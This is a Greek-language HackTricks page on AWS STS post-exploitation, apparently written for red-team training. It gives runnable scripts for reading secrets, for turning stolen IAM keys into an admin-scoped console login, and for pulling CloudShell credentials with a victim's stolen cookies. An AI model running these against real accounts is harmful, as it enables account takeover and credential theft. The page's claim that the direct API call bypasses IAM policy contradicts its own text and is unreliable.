# AWS - STS Post Exploitation

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## STS

Για περισσότερες πληροφορίες:

{% content-ref url="../../aws-security/aws-services/aws-iam-enum.md" %}
[aws-iam-enum.md](../../aws-security/aws-services/aws-iam-enum.md)
{% endcontent-ref %}

#### Νέα Μέθοδος Δεκέμβριος 2024: Παράκαμψη Απαιτήσεων για Σύνδεσμο Ιστοσελίδας, Με HTTPS POST Αίτημα Στο SecretsManager API Για Άμεση Απόκτηση Μυστικών (Χωρίς Σύνδεσμο Σύνδεσης Ή Ιστοσελίδα)

Υποβλήθηκε χθες, ως PR για την επερχόμενη εξέταση (ARTE: ex16x41) ωστόσο βλέπω ότι το PR δεν εμφανίζεται, ίσως υποβλήθηκε λάθος, ας προσπαθήσουμε ξανά:
Χρησιμοποιώντας αυτή τη μέθοδο παρακάμπτετε εντελώς την απαίτηση για άνοιγμα οποιωνδήποτε URL, μορφοποίηση οποιωνδήποτε συνδέσμων σύνδεσης ή ακόμα και χρήση του CLI / Ιστοσελίδας.
Τι κάναμε λοιπόν εδώ;
Έγραψα αυτό το σενάριο που αλληλεπιδρά απευθείας με το AWS Secrets Manager API, είναι απολύτως απλό και ευθύ.
Όταν εκτελείτε το σενάριο, στέλνει ένα HTTPS POST αίτημα στο AWS Secrets Manager endpoint
https://secretsmanager.<region>.amazonaws.com/
Το αίτημα GetSecretValue αποστέλλεται ως μέρος του POST αιτήματος, πιστοποιημένο με υπογραφή SigV4 (διαχειριζόμενο από το boto3).
Ο Secrets Manager Επεξεργάζεται το Αίτημα:
Η AWS επικυρώνει το αίτημα σύμφωνα με τις πολιτικές IAM που είναι συνδεδεμένες με τον χρήστη ή τον ρόλο σας (όπως γνωρίζουμε μπορούμε να δούμε την τιμή του μυστικού μόνο ως ιστοσελίδα)
Εάν επιτρέπεται, η υπηρεσία Secrets Manager επιστρέφει την ζητούμενη τιμή μυστικού στην απάντηση.
**Δημοσίευση POC:**
Η εντολή CLI AWS για να αποκτήσετε την τιμή του μυστικού δεν λειτουργεί επειδή η πρόσβαση απορρίπτεται ->
Ωστόσο, στην εικόνα μπορείτε να δείτε την απλότητα της μεθόδου για να εξαγάγετε απευθείας τη σημαία γνωρίζοντας το ID του μυστικού (αυτό το ενοποιούμε σε πρώιμο στάδιο όταν συνδεόμαστε με το προφίλ χρήστη)
![image](https://github.com/user-attachments/assets/d05a1a96-04c0-4404-b4bd-dbfa93c6494b)
Σημείωση: Νομίζω ότι αυτή η μέθοδος μπορεί να χρησιμοποιηθεί καθολικά ανάλογα με το σενάριο αν η πολιτική επιτρέπει (αλλά παρακάμπτει περιορισμούς πολιτικής που δεν επιτρέπει μέσω CLI)
Έτσι, αυτό μπορεί να χρησιμοποιηθεί οποτεδήποτε μια πολιτική επιτρέπει (ως εναλλακτική επιλογή δοκιμής)
Σημείωση: περίεργος για άλλες τεχνικές που μπορείτε να εφαρμόσετε χρησιμοποιώντας την ίδια μέθοδο άμεσης αλληλεπίδρασης με το API της υπηρεσίας και τώρα το AWS CLI, για οποιαδήποτε διαδικασία priv esc ή post exploitation όπως εδώ.
**Κώδικας:**
'''
Python
import boto3

session = boto3.Session(profile_name="lab6")
client = session.client("secretsmanager", region_name="us-east-1")

# Set a custom User-Agent
client.meta.events.register(
'before-call.secretsmanager.GetSecretValue',
lambda params, **kwargs: params['headers'].update({'User-Agent': 'my-custom-tool'})
)

# Retrieve the secret value directly via secretsmanager API
response = client.get_secret_value(SecretId="flag_sts_lab_3")
print(response['SecretString'])
'''

### Από IAM Πιστοποιήσεις Στη Ιστοσελίδα

Εάν έχετε καταφέρει να αποκτήσετε κάποιες IAM πιστοποιήσεις μπορεί να σας ενδιαφέρει να **έχετε πρόσβαση στην ιστοσελίδα** χρησιμοποιώντας τα παρακάτω εργαλεία.\
Σημειώστε ότι ο χρήστης/ρόλος πρέπει να έχει την άδεια **`sts:GetFederationToken`**.

#### Προσαρμοσμένο σενάριο

Το παρακάτω σενάριο θα χρησιμοποιήσει το προεπιλεγμένο προφίλ και μια προεπιλεγμένη τοποθεσία AWS (όχι gov και όχι cn) για να σας δώσει ένα υπογεγραμμένο URL που μπορείτε να χρησιμοποιήσετε για να συνδεθείτε στην ιστοσελίδα:

{% code overflow="wrap" %}
```bash
# Get federated creds (you must indicate a policy or they won't have any perms)
## Even if you don't have Admin access you can indicate that policy to make sure you get all your privileges
## Don't forget to use [--profile <prof_name>] in the first line if you need to
output=$(aws sts get-federation-token --name consoler --policy-arns arn=arn:aws:iam::aws:policy/AdministratorAccess)

if [ $? -ne 0 ]; then
echo "The command 'aws sts get-federation-token --name consoler' failed with exit status $status"
exit $status
fi

# Parse the output
session_id=$(echo $output | jq -r '.Credentials.AccessKeyId')
session_key=$(echo $output | jq -r '.Credentials.SecretAccessKey')
session_token=$(echo $output | jq -r '.Credentials.SessionToken')

# Construct the JSON credentials string
json_creds=$(echo -n "{\"sessionId\":\"$session_id\",\"sessionKey\":\"$session_key\",\"sessionToken\":\"$session_token\"}")

# Define the AWS federation endpoint
federation_endpoint="https://signin.aws.amazon.com/federation"

# Make the HTTP request to get the sign-in token
resp=$(curl -s "$federation_endpoint" \
--get \
--data-urlencode "Action=getSigninToken" \
--data-urlencode "SessionDuration=43200" \
--data-urlencode "Session=$json_creds"
)
signin_token=$(echo -n $resp | jq -r '.SigninToken' | tr -d '\n' | jq -sRr @uri)



# Give the URL to login
echo -n "https://signin.aws.amazon.com/federation?Action=login&Issuer=example.com&Destination=https%3A%2F%2Fconsole.aws.amazon.com%2F&SigninToken=$signin_token"
```
{% endcode %}

#### aws\_consoler

Μπορείτε να **δημιουργήσετε έναν σύνδεσμο ιστού κονσόλας** με [https://github.com/NetSPI/aws\_consoler](https://github.com/NetSPI/aws\_consoler).
```bash
cd /tmp
python3 -m venv env
source ./env/bin/activate
pip install aws-consoler
aws_consoler [params...] #This will generate a link to login into the console
```
{% hint style="warning" %}
Βεβαιωθείτε ότι ο χρήστης IAM έχει άδεια `sts:GetFederationToken`, ή παρέχετε έναν ρόλο για να αναληφθεί.
{% endhint %}

#### aws-vault

[**aws-vault**](https://github.com/99designs/aws-vault) είναι ένα εργαλείο για την ασφαλή αποθήκευση και πρόσβαση στα διαπιστευτήρια AWS σε ένα περιβάλλον ανάπτυξης.
```bash
aws-vault list
aws-vault exec jonsmith -- aws s3 ls # Execute aws cli with jonsmith creds
aws-vault login jonsmith # Open a browser logged as jonsmith
```
{% hint style="info" %}
Μπορείτε επίσης να χρησιμοποιήσετε το **aws-vault** για να αποκτήσετε μια **συνεδρία κονσόλας προγράμματος περιήγησης**
{% endhint %}

#### Από την Κονσόλα στα IAM Creds

[**Ανακαλύφθηκε αρχικά σε αυτή την ανάρτηση**](https://blog.christophetd.fr/retrieving-aws-security-credentials-from-the-aws-console/), Εάν καταφέρετε να παραβιάσετε κάποια πρόσβαση σε μια διαδικτυακή κονσόλα (ίσως κλέψατε cookies και δεν μπορούσατε να αποκτήσετε πρόσβαση στον φάκελο .aws), μπορείτε να αποκτήσετε κάποια IAM token credentials για αυτόν τον χρήστη μέσω του **CloudShell**.

Το CloudShell εκθέτει IAM credentials μέσω ενός **μη τεκμηριωμένου endpoint στην πόρτα 1338**. Αφού φορτώσετε τα session cookies του θύματος στον περιηγητή σας, μπορείτε να μεταβείτε στο CloudShell και να εκδώσετε τις παρακάτω εντολές για να αποκτήσετε IAM credentials.
```bash
TOKEN=$(curl -X PUT localhost:1338/latest/api/token -H "X-aws-ec2-metadata-token-ttl-seconds: 60")
curl localhost:1338/latest/meta-data/container/security-credentials -H "X-aws-ec2-metadata-token: $TOKEN"
```
{% hint style="success" %}
Μάθετε & εξασκηθείτε στο AWS Hacking:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Μάθετε & εξασκηθείτε στο GCP Hacking: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Υποστηρίξτε το HackTricks</summary>

* Ελέγξτε τα [**σχέδια συνδρομής**](https://github.com/sponsors/carlospolop)!
* **Εγγραφείτε στην** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Μοιραστείτε κόλπα hacking υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
